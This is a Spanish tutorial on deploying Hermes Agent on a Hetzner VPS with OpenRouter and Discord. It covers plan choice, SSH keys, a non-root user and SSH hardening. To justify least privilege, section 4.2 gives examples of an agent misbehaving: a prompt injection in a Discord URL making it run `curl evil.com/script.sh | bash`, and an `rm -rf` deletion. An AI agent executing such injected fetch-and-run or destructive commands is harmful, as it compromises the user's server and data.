# Cómo me monté Hermes Agent en un VPS de Hetzner con OpenRouter

Este artículo es, en buena medida, un tutorial para mí mismo. Lo fui escribiendo mientras desplegaba Hermes Agent (https://github.com/NousResearch/hermes-agent) en un VPS de Hetzner, conectándolo a Discord y usando OpenRouter (https://openrouter.ai/) como proveedor de LLMs.

Lo publico así porque Hermes está cambiando muy rápido. Acaba de salir hace poco, muchas piezas están mejorando en tiempo real y hay comportamientos que cambian entre una versión y la siguiente. Por eso este walkthrough intenta reflejar lo que 𝘀𝗶́ me ha funcionado en una instalación real, con notas donde la documentación oficial y el comportamiento del binario aún no van totalmente alineados.

> 𝗗𝗼𝗰𝘂𝗺𝗲𝗻𝘁𝗮𝗰𝗶𝗼́𝗻 𝗼𝗳𝗶𝗰𝗶𝗮𝗹 𝗱𝗲 𝗿𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗶𝗮: https://hermes-agent.nousresearch.com/docs
>
> 𝗥𝗲𝗽𝗼𝘀𝗶𝘁𝗼𝗿𝗶𝗼: https://github.com/NousResearch/hermes-agent
>
> 𝗡𝗼𝘁𝗮: este tutorial sigue un único camino concreto: Hetzner + Ubuntu + Docker backend + OpenRouter + Discord. Hermes soporta más variantes, pero aquí me centro solo en la que he probado de verdad.

---

## Tabla de contenidos

1. Qué es Hermes Agent y arquitectura objetivo
2. Elegir el VPS de Hetzner
3. Provisionar el servidor
4. Hardening inicial: usuario, SSH y firewall
5. Instalar Docker y Docker Compose
6. Instalar Hermes Agent
7. Configurar OpenRouter como proveedor
8. Configurar varios modelos para distintas tareas
9. Skills de código y backend Docker para ejecución segura
10. Conectar Hermes con Discord
11. Estructura de carpetas para proyectos
12. Cron diario de resumen por proyecto
13. Convertir Hermes en servicio systemd 24/7
14. Seguridad y límites
15. Pasar un prototipo a producción con Sliplane
16. Checklist final

---

## 1. Qué es Hermes Agent y arquitectura objetivo

Hermes Agent (https://github.com/NousResearch/hermes-agent) es un agente open-source de Nous Research (sucesor de OpenClaw) con:

- 𝗠𝘂́𝗹𝘁𝗶𝗽𝗹𝗲𝘀 𝗴𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗱𝗲 𝗺𝗲𝗻𝘀𝗮𝗷𝗲𝗿𝗶́𝗮: CLI, Discord, Telegram, Slack, WhatsApp, Signal, Home Assistant — todos desde un proceso `hermes gateway`.
- 𝗖𝗼𝗺𝗽𝗮𝘁𝗶𝗯𝗶𝗹𝗶𝗱𝗮𝗱 𝗰𝗼𝗻 𝗰𝘂𝗮𝗹𝗾𝘂𝗶𝗲𝗿 𝗽𝗿𝗼𝘃𝗲𝗲𝗱𝗼𝗿 𝗢𝗽𝗲𝗻𝗔𝗜-𝗰𝗼𝗺𝗽𝗮𝘁𝗶𝗯𝗹𝗲: Nous Portal, 𝗢𝗽𝗲𝗻𝗥𝗼𝘂𝘁𝗲𝗿 (200+ modelos), Anthropic, OpenAI, DeepSeek directo, GLM, Kimi, Hugging Face, endpoints locales, etc.
- 𝗦𝗸𝗶𝗹𝗹𝘀 𝗮𝘂𝘁𝗼-𝗰𝗿𝗲𝗮𝗱𝗮𝘀 𝘆 𝗲𝗰𝗼𝘀𝗶𝘀𝘁𝗲𝗺𝗮 𝗮𝗴𝗲𝗻𝘁𝘀𝗸𝗶𝗹𝗹𝘀.𝗶𝗼 (https://agentskills.io).
- 𝗠𝗲𝗺𝗼𝗿𝗶𝗮 𝗽𝗲𝗿𝘀𝗶𝘀𝘁𝗲𝗻𝘁𝗲 con resumen LLM y FTS5.
- 𝗖𝗿𝗼𝗻 𝘀𝗰𝗵𝗲𝗱𝘂𝗹𝗲𝗿 𝗶𝗻𝘁𝗲𝗴𝗿𝗮𝗱𝗼 para tareas autónomas (heartbeats, reports nocturnos, auditorías).
- 𝗕𝗮𝗰𝗸𝗲𝗻𝗱𝘀 𝗱𝗲 𝘁𝗲𝗿𝗺𝗶𝗻𝗮𝗹: local, 𝗗𝗼𝗰𝗸𝗲𝗿 (sandbox), SSH, Modal, Daytona, Singularity.
- 𝗗𝗲𝗹𝗲𝗴𝗮𝗰𝗶𝗼́𝗻 𝗮 𝘀𝘂𝗯𝗮𝗴𝗲𝗻𝘁𝗲𝘀 con modelo distinto al principal (clave para abaratar costes).

> Refs: README oficial (https://github.com/NousResearch/hermes-agent/blob/main/README.md), Quickstart (https://hermes-agent.nousresearch.com/docs/getting-started/quickstart/), Configuration (https://hermes-agent.nousresearch.com/docs/user-guide/configuration/).

### Arquitectura que vamos a montar


```
┌─────────────────────────────────────────────────────────────┐
│                      Hetzner VPS (Linux)                    │
│                                                             │
│  ┌─────────────┐   ┌──────────────────────────────────┐     │
│  │  Discord    │──▶│  hermes gateway  (systemd)       │     │
│  │  (tu cliente)│   │  ────────────────────────────── │     │
│  └─────────────┘   │  hermes core agent               │     │
│                    │   ├─ OpenRouter (Qwen + MiniMax) │     │
│                    │   ├─ Memory (~/.hermes/data)     │     │
│                    │   ├─ Skills (~/.hermes/skills)   │     │
│                    │   └─ Cron / Heartbeats           │     │
│                    └──────┬────────────────────┬──────┘     │
│                           │ terminal.backend   │            │
│                           │ = docker           │            │
│                           ▼                    ▼            │
│   /home/hermes/projects/proyecto-A   /home/hermes/projects/proyecto-B
│   ├─ docker-compose.yml              ├─ docker-compose.yml  │
│   ├─ src/                            ├─ src/                │
│   ├─ README.md                       ├─ README.md           │
│   └─ ARTICLE.md                      └─ ARTICLE.md          │
│                                                             │
│   ┌──────────────────────────────────────────────────┐      │
│   │  Caddy (reverse proxy + HTTPS automático)        │      │
│   │  proyecto-a.lab.rustyroboz.com → contenedor A:8080 │    │
│   │  proyecto-b.lab.rustyroboz.com → contenedor B:3000 │    │
│   └──────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────┘
```

---

## 2. Elegir el VPS de Hetzner

Precios actualizados al ajuste del 𝟭 𝗮𝗯𝗿𝗶𝗹 𝟮𝟬𝟮𝟲 (fuente (https://docs.hetzner.com/general/infrastructure-and-availability/price-adjustment/)). Todos los planes incluyen 20 TB de tráfico, 1 IPv4, IPv6 y firewall gratuito.

- CX22
  - vCPU: 2
  - RAM: 4 GB
  - Disco: 40 GB
  - Precio/mes: ~3,79 €
  - Recomendado para: Hermes solo, 1-2 contenedores chicos
- 𝗖𝗫𝟯𝟮
  - vCPU: 𝟰
  - RAM: 𝟴 𝗚𝗕
  - Disco: 𝟴𝟬 𝗚𝗕
  - Precio/mes: ~𝟲,𝟴𝟬 €
  - Recomendado para: ★ 𝗦𝘄𝗲𝗲𝘁 𝘀𝗽𝗼𝘁: 𝗛𝗲𝗿𝗺𝗲𝘀 + 𝟰-𝟲 𝗽𝗿𝗼𝘁𝗼𝘁𝗶𝗽𝗼𝘀 𝗗𝗼𝗰𝗸𝗲𝗿
- CX42
  - vCPU: 8
  - RAM: 16 GB
  - Disco: 160 GB
  - Precio/mes: ~16,40 €
  - Recomendado para: Si planeas correr modelos locales o muchos servicios
- CAX21 (ARM)
  - vCPU: 4
  - RAM: 8 GB
  - Disco: 80 GB
  - Precio/mes: ~6 €
  - Recomendado para: Igual que CX32 si tus stacks son ARM-friendly

𝗥𝗲𝗰𝗼𝗺𝗲𝗻𝗱𝗮𝗰𝗶𝗼́𝗻: empieza con 𝗖𝗫𝟯𝟮 (Ubuntu 24.04 LTS, datacenter Falkenstein o Helsinki). Es trivialmente escalable a CX42 sin reinstalar (Hetzner permite redimensionar en caliente).

> ⚠️ CX y CAX solo están en datacenters de la UE. Si necesitas EE.UU. o Singapur, usa CPX o CCX.

📸 [images/02-hetzner-plans.png] *(captura del comparador de planes)*

---

## 3. Provisionar el servidor

### 3.1. Crea la cuenta y un proyecto

1. Ve a https://console.hetzner.cloud/ y crea cuenta. Pide validación con tarjeta o PayPal (Hetzner activa cuentas en minutos pero a veces pide ID los primeros días).
2. Crea un nuevo 𝗣𝗿𝗼𝗷𝗲𝗰𝘁 (ej. `Hermes`).

📸 [images/03-hetzner-project.png]

### 3.2. Sube tu clave SSH

Antes de crear el servidor genera (en tu máquina local) una clave dedicada. 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁𝗲: usa la sintaxis adecuada según tu sistema operativo — la expansión de `~` no funciona igual en PowerShell que en bash.

#### En Linux / macOS / WSL / Git Bash

```bash
ssh-keygen -t ed25519 -C "hetzner-hermes" -f ~/.ssh/hetzner_hermes
```

#### En Windows PowerShell

PowerShell no siempre expande `~`. Usa `$HOME` y backslashes:

```powershell
# Asegura que existe la carpeta .ssh (idempotente)
New-Item -ItemType Directory -Path $HOME\.ssh -Force | Out-Null

# Genera la clave
ssh-keygen -t ed25519 -C "hetzner-hermes" -f $HOME\.ssh\hetzner_hermes
```

> Si te aparece `Saving key "~/.ssh/hetzner_hermes" failed: No such file or directory`, es exactamente este problema: `~` no se está expandiendo. Usa `$HOME` como arriba.
>
> Si te aparece `'ssh-keygen' is not recognized`, falta el cliente OpenSSH. Instálalo desde PowerShell 𝗰𝗼𝗺𝗼 𝗮𝗱𝗺𝗶𝗻𝗶𝘀𝘁𝗿𝗮𝗱𝗼𝗿 con: `Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0` y abre una sesión nueva.

#### Verifica que las dos claves se han creado

```powershell
# PowerShell
Get-ChildItem $HOME\.ssh\hetzner_hermes*
```

```bash
# bash
ls -la ~/.ssh/hetzner_hermes*
```

Debes ver dos archivos:

- `hetzner_hermes` → 𝗰𝗹𝗮𝘃𝗲 𝗽𝗿𝗶𝘃𝗮𝗱𝗮 (queda en tu portátil; no se sube a ningún sitio).
- `hetzner_hermes.pub` → 𝗰𝗹𝗮𝘃𝗲 𝗽𝘂́𝗯𝗹𝗶𝗰𝗮 (la que pegas en Hetzner).

#### Copia la pública al portapapeles

```powershell
# PowerShell
Get-Content $HOME\.ssh\hetzner_hermes.pub | Set-Clipboard
```

```bash
# macOS
pbcopy < ~/.ssh/hetzner_hermes.pub

# Linux con xclip
xclip -selection clipboard < ~/.ssh/hetzner_hermes.pub
```

#### Pégala en Hetzner

Consola Hetzner → 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 → 𝗦𝗦𝗛 𝗞𝗲𝘆𝘀 → 𝗔𝗱𝗱 𝗦𝗦𝗛 𝗞𝗲𝘆, pega el contenido y dale un nombre identificativo (`hetzner-hermes-laptop`, por ejemplo).

📸 [images/04-hetzner-ssh-key.png]

> ⚠️ 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁𝗲: las claves del panel de Hetzner solo se inyectan cuando 𝗰𝗿𝗲𝗮𝘀 𝘂𝗻 𝘀𝗲𝗿𝘃𝗶𝗱𝗼𝗿 𝗻𝘂𝗲𝘃𝗼. Si ya tienes el servidor creado y subes una clave nueva al panel, 𝗻𝗼 𝘀𝗲 𝗽𝗿𝗼𝗽𝗮𝗴𝗮 𝗮𝗹 𝘀𝗲𝗿𝘃𝗶𝗱𝗼𝗿 𝗲𝘅𝗶𝘀𝘁𝗲𝗻𝘁𝗲. En ese caso tienes que añadirla manualmente al `~/.ssh/authorized_keys` del usuario en el VPS:
>
> ```powershell
> # desde tu portátil — añade tu clave pública al authorized_keys del VPS en una sola línea
> Get-Content $HOME\.ssh\hetzner_hermes.pub | ssh hermes@SERVER_IP "cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
> ```
>
> Asume que `hermes` ya existe (paso 4.2 hecho) y que entras con alguna otra clave válida. Si todavía no has hecho el paso 4 y quieres probar con root, sustituye `hermes` por `root` en el comando.

### 3.3. Crea el servidor

En la pantalla 𝗔𝗱𝗱 𝗦𝗲𝗿𝘃𝗲𝗿 rellena solo lo siguiente:

- 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻
  - Valor: Falkenstein (FSN1) o Helsinki (HEL1)
  - Notas: Cualquier datacenter UE vale
- 𝗜𝗺𝗮𝗴𝗲
  - Valor: Ubuntu 24.04
  - Notas: LTS, soporte hasta 2029
- 𝗧𝘆𝗽𝗲
  - Valor: CX32 (Shared vCPU · x86)
  - Notas: Pestaña "Shared vCPU"
- 𝗡𝗲𝘁𝘄𝗼𝗿𝗸𝗶𝗻𝗴 → 𝗣𝘂𝗯𝗹𝗶𝗰 𝗜𝗣𝘃𝟰
  - Valor: ✅ 𝗔𝗖𝗧𝗜𝗩𝗔𝗗𝗢
  - Notas: ~0,50 €/mes extra. 𝗡𝗲𝗰𝗲𝘀𝗮𝗿𝗶𝗼 porque muchos ISP residenciales no rutan IPv6 — sin IPv4 tu propio navegador puede no llegar a tus prototipos
- 𝗡𝗲𝘁𝘄𝗼𝗿𝗸𝗶𝗻𝗴 → 𝗣𝘂𝗯𝗹𝗶𝗰 𝗜𝗣𝘃𝟲
  - Valor: ✅ activado (gratis)
  - Notas: Déjalo activo
- 𝗡𝗲𝘁𝘄𝗼𝗿𝗸𝗶𝗻𝗴 → 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗻𝗲𝘁𝘄𝗼𝗿𝗸𝘀
  - Valor: (vacío)
  - Notas: Solo si quieres LAN entre varios servidores Hetzner
- 𝗦𝗦𝗛 𝗞𝗲𝘆𝘀
  - Valor: ✅ tu clave del paso 3.2
  - Notas: Crítico: si no marcas ninguna, Hetzner manda password por email
- 𝗩𝗼𝗹𝘂𝗺𝗲𝘀
  - Valor: (vacío)
  - Notas: El disco de 80 GB del CX32 ya basta
- 𝗙𝗶𝗿𝗲𝘄𝗮𝗹𝗹𝘀
  - Valor: (vacío)
  - Notas: Lo creamos en el paso 4.4
- 𝗕𝗮𝗰𝗸𝘂𝗽𝘀
  - Valor: ✅ activar
  - Notas: +20% del precio (~1,36 €). Snapshots diarios, 7 retenciones. Recomendado
- 𝗣𝗹𝗮𝗰𝗲𝗺𝗲𝗻𝘁 𝗴𝗿𝗼𝘂𝗽𝘀
  - Valor: ❌ omitir
  - Notas: Solo sirve para distribuir varios servidores en hardware distinto. No aplica a 1 VPS
- 𝗟𝗮𝗯𝗲𝗹𝘀
  - Valor: ❌ omitir
  - Notas: Tags opcionales para agrupar recursos en proyectos grandes. Innecesario aquí
- 𝗖𝗹𝗼𝘂𝗱 𝗰𝗼𝗻𝗳𝗶𝗴 / 𝗨𝘀𝗲𝗿 𝗱𝗮𝘁𝗮
  - Valor: ❌ omitir
  - Notas: Sería un script `cloud-init` para auto-provisión. Lo hacemos a mano en el paso 4
- 𝗡𝗮𝗺𝗲
  - Valor: `hermes-lab`

Pulsa 𝗖𝗿𝗲𝗮𝘁𝗲 & 𝗕𝘂𝘆 𝗻𝗼𝘄.

📸 [images/05-hetzner-create-server.png]

Anota la 𝗜𝗣 𝗽𝘂́𝗯𝗹𝗶𝗰𝗮 𝗜𝗣𝘃𝟰 que aparece tras unos segundos (la usaremos como `SERVER_IP`).

### 3.4. Primer login

Desde tu máquina local:

```bash
ssh -i ~/.ssh/hetzner_hermes root@SERVER_IP
```

Acepta la huella. Si entra, todo bien.

---

## 4. Hardening inicial: usuario, SSH y firewall

### 4.1. Actualiza el sistema e instala dependencias base

Estos paquetes son 𝗱𝗲𝗽𝗲𝗻𝗱𝗲𝗻𝗰𝗶𝗮𝘀 𝗱𝗲𝗹 𝘀𝗶𝘀𝘁𝗲𝗺𝗮 𝗼𝗽𝗲𝗿𝗮𝘁𝗶𝘃𝗼, no de Hermes. Cubren tres cosas: seguridad, parcheo automático y herramientas comunes que Docker y otros instaladores asumen.

```bash
apt update && apt upgrade -y
apt install -y ufw fail2ban unattended-upgrades curl git build-essential ca-certificates gnupg lsb-release htop
dpkg-reconfigure -plow unattended-upgrades   # acepta los defaults
```

𝗤𝘂𝗲́ 𝗵𝗮𝗰𝗲 𝗰𝗮𝗱𝗮 𝗽𝗮𝗾𝘂𝗲𝘁𝗲 𝘆 𝗽𝗼𝗿 𝗾𝘂𝗲́ 𝗹𝗼 𝗻𝗲𝗰𝗲𝘀𝗶𝘁𝗮𝘀:

- `ufw`
  - Para qué sirve: Firewall a nivel de host (paso 4.4)
  - ¿Imprescindible?: Sí
- `fail2ban`
  - Para qué sirve: Banea IPs tras N intentos fallidos de SSH (paso 4.5)
  - ¿Imprescindible?: Sí
- `unattended-upgrades`
  - Para qué sirve: Aplica parches de seguridad automáticamente sin tocar nada
  - ¿Imprescindible?: Sí (lab 24/7)
- `curl`
  - Para qué sirve: Descarga el instalador de Hermes y la GPG key de Docker
  - ¿Imprescindible?: Sí
- `git`
  - Para qué sirve: 𝗨́𝗻𝗶𝗰𝗮 𝗱𝗲𝗽𝗲𝗻𝗱𝗲𝗻𝗰𝗶𝗮 "𝗺𝗮𝗻𝘂𝗮𝗹" 𝗾𝘂𝗲 𝗛𝗲𝗿𝗺𝗲𝘀 𝗽𝗶𝗱𝗲 𝗲𝘅𝗽𝗹𝗶́𝗰𝗶𝘁𝗮𝗺𝗲𝗻𝘁𝗲. El resto las gestiona el `install.sh`
  - ¿Imprescindible?: Sí
- `build-essential`
  - Para qué sirve: gcc/make: necesario si alguna skill compila código nativo
  - ¿Imprescindible?: Recomendado
- `ca-certificates`
  - Para qué sirve: Certificados raíz para HTTPS (Docker repo, OpenRouter)
  - ¿Imprescindible?: Sí
- `gnupg`, `lsb-release`
  - Para qué sirve: Verificar firmas y detectar versión Ubuntu (Docker repo)
  - ¿Imprescindible?: Sí
- `htop`
  - Para qué sirve: Monitor interactivo de procesos
  - ¿Imprescindible?: Comodidad

#### ¿Y las dependencias de Hermes en sí?

𝗡𝗼 𝗶𝗻𝘀𝘁𝗮𝗹𝗲𝘀 𝗣𝘆𝘁𝗵𝗼𝗻, 𝗡𝗼𝗱𝗲, 𝘂𝘃, 𝗿𝗶𝗽𝗴𝗿𝗲𝗽 𝗻𝗶 𝗳𝗳𝗺𝗽𝗲𝗴 𝗺𝗮𝗻𝘂𝗮𝗹𝗺𝗲𝗻𝘁𝗲. El instalador oficial (`scripts/install.sh`, paso 6) los provisiona en un entorno aislado para evitar choques con paquetes del sistema. Concretamente, según la docu oficial de instalación (https://hermes-agent.nousresearch.com/docs/getting-started/installation):

- 𝘂𝘃 (gestor de paquetes Python ultrarrápido)
- 𝗣𝘆𝘁𝗵𝗼𝗻 𝟯.𝟭𝟭 dentro de un venv aislado
- 𝗡𝗼𝗱𝗲.𝗷𝘀 𝘃𝟮𝟮 (necesario para skills basadas en npm y para `agent-browser` del paso 9.4)
- 𝗿𝗶𝗽𝗴𝗿𝗲𝗽 (búsquedas FTS en código)
- 𝗳𝗳𝗺𝗽𝗲𝗴 (conversión de audio para voice mode)

Para diagnosticar o reparar dependencias después de la instalación, usa:

```bash
hermes doctor       # diagnóstico completo (te dice qué falta y cómo arreglarlo)
hermes update       # vuelve a tirar del install.sh y actualiza todo
```

> Hermes 𝗻𝗼 tiene un comando `hermes deps install` separado: la gestión de dependencias está incorporada en el propio `install.sh` y en `hermes update`. Refs: Installation (https://hermes-agent.nousresearch.com/docs/getting-started/installation), CLI Reference (https://hermes-agent.nousresearch.com/docs/reference/cli-commands).

### 4.2. Crea un usuario no-root para Hermes

Hermes debe vivir en su propio usuario (no root) para limitar daño en caso de 𝗥𝗖𝗘 𝗮𝗰𝗰𝗶𝗱𝗲𝗻𝘁𝗮𝗹.

> ¿𝗤𝘂𝗲́ 𝗲𝘀 𝘂𝗻 𝗥𝗖𝗘 𝗮𝗰𝗰𝗶𝗱𝗲𝗻𝘁𝗮𝗹?
>
> RCE = *Remote Code Execution* (ejecución remota de código). En este contexto NO es un atacante explotando una vulnerabilidad: es 𝗲𝗹 𝗽𝗿𝗼𝗽𝗶𝗼 𝗮𝗴𝗲𝗻𝘁𝗲 ejecutando un comando que no debía. Ejemplos reales que pasan en agentes LLM:
>
> - El modelo malinterpreta una instrucción y hace `rm -rf ~/proyectos` pensando que limpia un build.
> - Un usuario en Discord lanza un *prompt injection* dentro de una URL y Hermes acaba ejecutando `curl evil.com/script.sh | bash`.
> - Una skill mal escrita (o auto-generada por el propio agente) entra en un bucle que escribe en `/etc/`.
>
> Si Hermes vive como `root`, cualquiera de esos errores compromete todo el servidor: borra el sistema, modifica `/etc/sudoers`, lee `/root/.ssh/`, etc. Como usuario `hermes` sin acceso a archivos del sistema, el "explosion radius" se queda en `/home/hermes/`. Es la primera línea de defensa: 𝗺𝗲𝗻𝗼𝘀 𝗽𝗿𝗶𝘃𝗶𝗹𝗲𝗴𝗶𝗼𝘀 = 𝗺𝗲𝗻𝗼𝘀 𝗱𝗮𝗻̃𝗼 𝗰𝘂𝗮𝗻𝗱𝗼 𝗮𝗹𝗴𝗼 𝘃𝗮 𝗺𝗮𝗹.

```bash
adduser --disabled-password --gecos "" hermes
usermod -aG sudo hermes
mkdir -p /home/hermes/.ssh
cp /root/.ssh/authorized_keys /home/hermes/.ssh/
chown -R hermes:hermes /home/hermes/.ssh
chmod 700 /home/hermes/.ssh
chmod 600 /home/hermes/.ssh/authorized_keys
```

Concede sudo sin password (cómodo para automatizaciones; si prefieres con password, salta este bloque):

```bash
echo "hermes ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/hermes
chmod 440 /etc/sudoers.d/hermes
```

### 4.3. Endurece SSH

#### ¿Para qué sirve "endurecer SSH"?

Tu VPS está en Internet pública, con una IPv4 fija. Desde el segundo en que se enciende, 𝗯𝗼𝘁𝘀 𝗮𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝘇𝗮𝗱𝗼𝘀 empiezan a probar logins por SSH (puerto 22) intentando contraseñas comunes (`root/123456`, `admin/admin`, …) o claves filtradas. No es paranoia: si miras `/var/log/auth.log` a las pocas horas de crear el servidor, verás cientos de intentos.

"Endurecer SSH" significa cambiar la configuración por defecto del demonio (`sshd`) para que esos intentos automatizados ni siquiera tengan opción. Con la config que vamos a aplicar, un bot que intente `ssh root@tu-ip` recibe rechazo inmediato sin llegar a probar password.

#### ¿Es necesario? ¿Te limita?

- ¿𝗘𝘀 𝗻𝗲𝗰𝗲𝘀𝗮𝗿𝗶𝗼? Sí, 𝗲𝘀𝗽𝗲𝗰𝗶𝗮𝗹𝗺𝗲𝗻𝘁𝗲 porque vamos a tener un agente con acceso a Docker y al filesystem corriendo 24/7. Una sola contraseña débil filtrada y pierdes todo.
- ¿𝗧𝗲 𝗹𝗶𝗺𝗶𝘁𝗮? Mínimamente, y solo si pierdes tu clave SSH. La tabla de abajo desglosa cada línea con su trade-off real.

#### Paso 1 — Escribe la configuración (todavía sin aplicar)

Esto solo crea el archivo. Hasta que no reinicies `ssh` (paso 3) la config nueva no entra en vigor, así que no hay riesgo de quedarte fuera todavía.

```bash
cat > /etc/ssh/sshd_config.d/99-hardening.conf <<'EOF'
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
KbdInteractiveAuthentication no
ChallengeResponseAuthentication no
MaxAuthTries 3
LoginGraceTime 20
AllowUsers hermes
EOF
```

Valida la sintaxis antes de aplicar:

```bash
sshd -t && echo "OK config" || echo "ERROR: revisa el archivo"
```

Si sale `ERROR`, corrige el archivo antes de seguir. `sshd -t` no toca nada, solo valida.

#### Qué hace cada línea (y qué limitación introduce)

- `PermitRootLogin no`
  - Qué hace: Bloquea el login directo como `root` por SSH. Para tareas privilegiadas, entras como `hermes` y usas `sudo`.
  - ¿Te limita?: No: en el paso 4.2 ya diste sudo NOPASSWD a `hermes`. Cualquier cosa que harías como root, la haces con `sudo`
- `PasswordAuthentication no`
  - Qué hace: Desactiva el login con contraseña. Solo se acepta clave SSH.
  - ¿Te limita?: 𝗦𝗶́, 𝗽𝗮𝗿𝗰𝗶𝗮𝗹𝗺𝗲𝗻𝘁𝗲: si pierdes la clave privada `~/.ssh/hetzner_hermes`, 𝗻𝗼 𝗽𝘂𝗲𝗱𝗲𝘀 𝗲𝗻𝘁𝗿𝗮𝗿 𝗽𝗼𝗿 𝗦𝗦𝗛. Mitigación: la consola web de Hetzner (Rescue mode) sigue funcionando con la contraseña root del email; desde ahí puedes resetear claves. 𝗡𝘂𝗻𝗰𝗮 𝘁𝗲 𝗾𝘂𝗲𝗱𝗮𝘀 𝗳𝘂𝗲𝗿𝗮 𝗱𝗲𝗹 𝘁𝗼𝗱𝗼
- `PubkeyAuthentication yes`
  - Qué hace: Activa explícitamente login por clave pública (es el default, pero lo dejamos explícito).
  - ¿Te limita?: No
- `KbdInteractiveAuthentication no`
  - Qué hace: Desactiva el método de auth interactivo (PAM, OTP por teclado…).
  - ¿Te limita?: No, salvo que quisieras montar 2FA con `google-authenticator`. Si en el futuro lo quieres, esto se pone a `yes`
- `ChallengeResponseAuthentication no`
  - Qué hace: Alias antiguo del anterior, lo dejamos explícito por compatibilidad.
  - ¿Te limita?: No
- `MaxAuthTries 3`
  - Qué hace: Cierra la conexión tras 3 intentos fallidos (en lugar del default 6). Combinado con `fail2ban`, banea la IP.
  - ¿Te limita?: Solo si te equivocas tecleando 3 veces — vuelves a conectar y reinicia el contador
- `LoginGraceTime 20`
  - Qué hace: Si no completas el login en 20 segundos, cierra. (Default: 120s.) Reduce ventana para ataques de fuerza bruta lentos.
  - ¿Te limita?: No: 20 s es de sobra para una conexión legítima con clave
- `AllowUsers hermes`
  - Qué hace: 𝗪𝗵𝗶𝘁𝗲𝗹𝗶𝘀𝘁 𝗲𝘅𝗽𝗹𝗶́𝗰𝗶𝘁𝗮: solo el usuario `hermes` puede abrir sesión SSH. Aunque crees otro usuario en el sistema, no podrá entrar por SSH a menos que lo añadas aquí.
  - ¿Te limita?: Solo si más adelante creas más usuarios para SSH (p.ej. un compañero). Editas esta línea: `AllowUsers hermes alice bob` y `systemctl restart ssh`

#### Lo que 𝗡𝗢 estamos cambiando

- 𝗣𝘂𝗲𝗿𝘁𝗼: seguimos en el 22. Cambiarlo a 2222 reduce ruido en logs (los bots escanean primero el 22) pero 𝗻𝗼 𝗮𝗻̃𝗮𝗱𝗲 𝘀𝗲𝗴𝘂𝗿𝗶𝗱𝗮𝗱 𝗿𝗲𝗮𝗹: un atacante serio escanea todos los puertos. Lo dejamos en 22 para que cualquier cliente SSH funcione sin `-p`.
- 𝟮𝗙𝗔: opcional para más adelante. Con clave SSH + fail2ban + `MaxAuthTries 3` ya estás muy por encima del 99 % de servidores en Internet.

#### Paso 2 — Prepara una sesión de seguridad (ANTES de aplicar)

> ⚠️ 𝗡𝗼 𝗰𝗶𝗲𝗿𝗿𝗲𝘀 𝗹𝗮 𝘀𝗲𝘀𝗶𝗼́𝗻 𝗿𝗼𝗼𝘁 𝗮𝗰𝘁𝘂𝗮𝗹. Va a ser tu red de seguridad por si la nueva config tiene algún problema. Hasta que verifiques que el login con `hermes` funciona, 𝗺𝗮𝗻𝘁𝗲́𝗻 𝗮𝗯𝗶𝗲𝗿𝘁𝗮 𝗹𝗮 𝘁𝗲𝗿𝗺𝗶𝗻𝗮𝗹 𝗱𝗼𝗻𝗱𝗲 𝗲𝘀𝘁𝗮́𝘀 𝗰𝗼𝗺𝗼 𝗿𝗼𝗼𝘁.

#### Paso 3 — Aplica la nueva config

Ahora sí, recarga `sshd` (`reload` aplica la nueva config sin matar las conexiones SSH ya abiertas, así que tu sesión root sigue viva):

```bash
systemctl reload ssh
```

> Si tu sistema solo tiene `restart` y no `reload`, usa `systemctl restart ssh`. Las conexiones SSH activas suelen sobrevivir a un restart porque el demonio solo se reinicia para nuevas conexiones, pero `reload` es la opción segura por defecto.

#### Paso 4 — Verifica desde otra terminal

En tu 𝗺𝗮́𝗾𝘂𝗶𝗻𝗮 𝗹𝗼𝗰𝗮𝗹, abre una terminal nueva (sin cerrar la del VPS) y prueba:

```bash
ssh -i ~/.ssh/hetzner_hermes hermes@SERVER_IP
```

- ✅ 𝗦𝗶 𝗲𝗻𝘁𝗿𝗮 𝗰𝗼𝗺𝗼 `𝗵𝗲𝗿𝗺𝗲𝘀` → la config nueva funciona. Ahora sí puedes cerrar la sesión root original.
- ❌ 𝗦𝗶 𝗳𝗮𝗹𝗹𝗮 → vuelve a la sesión root (que sigue abierta) y arregla el archivo `/etc/ssh/sshd_config.d/99-hardening.conf` o las claves en `/home/hermes/.ssh/authorized_keys`. Tras corregir, repite `sshd -t` y `systemctl reload ssh`.

#### Si te quedas fuera (plan B)

Cuando pasa lo peor (perdiste la clave, te equivocaste en `AllowUsers`, etc.):

1. Ve a la consola Hetzner → tu servidor → 𝗥𝗲𝘀𝗰𝘂𝗲 → 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗥𝗲𝘀𝗰𝘂𝗲 𝗦𝘆𝘀𝘁𝗲𝗺 (Linux 64).
2. Reinicia el VPS desde el panel.
3. Conecta vía la 𝗰𝗼𝗻𝘀𝗼𝗹𝗮 𝘄𝗲𝗯 (botón "Console") con la password root que Hetzner te muestra.
4. Monta el disco (`mount /dev/sda1 /mnt`) y arregla `/mnt/etc/ssh/sshd_config.d/99-hardening.conf` o `/mnt/home/hermes/.ssh/authorized_keys`.
5. Desactiva el rescue mode y reinicia normal.

Vamos: 𝗲𝗻𝗱𝘂𝗿𝗲𝗰𝗲𝗿 𝗻𝗼 𝘁𝗲 𝗲𝗻𝗰𝗶𝗲𝗿𝗿𝗮, te obliga a tener tu clave SSH organizada.

---

> ### 🔁 Cambio de usuario: a partir de aquí trabajas como `hermes`
>
> Si verificaste el paso 4.3.4 con éxito, 𝗰𝗶𝗲𝗿𝗿𝗮 𝗹𝗮 𝘀𝗲𝘀𝗶𝗼́𝗻 𝗿𝗼𝗼𝘁 y conéctate como `hermes`:
>
> ```bash
> # en tu máquina local
> ssh -i ~/.ssh/hetzner_hermes hermes@SERVER_IP
> ```
>
